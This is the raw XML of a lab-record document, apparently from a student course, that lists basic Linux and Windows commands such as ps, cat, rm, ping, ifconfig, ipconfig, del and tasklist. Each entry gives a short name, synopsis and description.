    <w:p w14:paraId="2524F1A7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>a) ps -e: See all current running processes in the system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1557661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8461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46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10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F452B3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C158EC5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. cat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2212EB11" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: cat - concatenate files and print on the standard output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD0BA4D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: cat [OPTION]... [FILE]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4487EE9E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Concatenate FILE(s) to standard output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDA0AA7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80649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0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12)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D767AF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. free</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B17533" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: free  -  Display  amount  of free and used memory in the system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE9EA16" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: free [options]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C62F8D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: free displays the total amount of free and used physical  and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221B11A9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>swap memory in the system, as well  as  the  buffers and  caches used by the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03814748" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>kernel.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1198423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5536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53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20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19300BA6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="633B9B78" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. rm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C84555" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: rm - remove files or directories</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E186F39" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: rm [OPTION]... [FILE]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6FB108" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION:  rm removes each specified file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E73E4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939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39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25)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574D4575" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. top</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6E6DE9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: top - display Linux processes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097B620F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: top [options]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D6D87D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: The  top  program provides a dynamic real-time view of a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E00BA90" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>running  system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D020B65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8029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02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29)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227BD671" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DE8219" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8. vmstat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A31B2C8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: vmstat - Report virtual memory statistics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA450E3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: vmstat [options] [delay [count]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DBFF113" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: vmstat reports information about processes, memory, paging,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57905339" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>block IO, traps, disks and cpu activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D58C12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6107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610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35)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596B6AA0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>9. ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E65F09" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: ping - send ICMP ECHO_REQUEST to network hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D886C2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS:  ping [-aAbBdCDfhHLnOqrRUvV346] [-c count]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B67393" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-e identifier] [-F flowlabel] [-i interval]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737CC9F5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-I interface] [-l preload] [-m mark]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="155CAA14" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF56E4D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-M pmtudisc_option] [-N nodeinfo_option]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489539D1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-w deadline] [-W timeout] [-p pattern] [-Q tos]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD7E975" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-s packetsize] [-S sndbuf] [-t ttl]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392401E0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[-T timestamp option] [hop...] {destination}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3568B615" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION:  ping uses the ICMP protocol's mandatory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1E16F4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ECHO_REQUEST datagram to elicit an ICMP ECHO_RESPONSE from a host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56634184" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>or gateway.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D54B9B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1900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19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38)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C24D4D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>10. ifconfig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1C7490" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: ifconfig - configure a network interface</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B0A03E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: ifconfig [-v] [-a] [-s] [interface]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07001B88" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ifconfig [-v] interface [aftype] options | address ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2CDBF1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Ifconfig  is  used to configure the kernel-resident network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FE747C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC77AE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36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6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40)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C30985" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D511B17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2B893126" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus the above linux commands were executed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492F58F1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="38740319" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:1b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A79EFC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Basic Networking Commands in Windows operating system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8B1FA3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66496DE1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To study and execute basic networking commands in Windows operating</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A093D63" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F84C0FA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. cd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EC11A2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: CD [/D] [drive:][path]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156D5363" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CD [..]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E24C725" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Displays the name of or changes the current directory.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F8A98A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78033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8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46)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758CD777" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. cls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3732E33F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: cls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3644BAD5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Clears the screen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C05A25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9737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73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51)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4EEBF9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. ipconfig</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BF8194" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: ipconfig [/allcompartments]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADAE79A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: The default is to display only the IP address, subnet mask</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF3DACE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and default gateway for each adapter bound to TCP/IP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781E0532" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BA52D0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38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38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54)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3107D4F3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. echo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14812A86" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: ECHO [ON | OFF]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A490BA8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ECHO [message]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F50EF9E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Displays messages, or turns command-echoing on or off.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F055417" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A77F27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7463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46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56)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369C84BC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. del</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9CF62B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799C893D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0549DD27" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Deletes one or more files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB5DB8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5055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05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58)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B403B7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. find</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FF615E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: FIND [/V] [/C] [/N] [/I] [/OFF[LINE]] "string"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08471D7B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>[[drive:][path]filename[ ...]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B42B25B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Searches for a text string in a file or files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C10927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46309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63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62)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6088EA91" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. tasklist</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9BAEDD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: TASKLIST [/S system [/U username [/P [password]]]]</w:t>
      </w:r>
    </w:p>
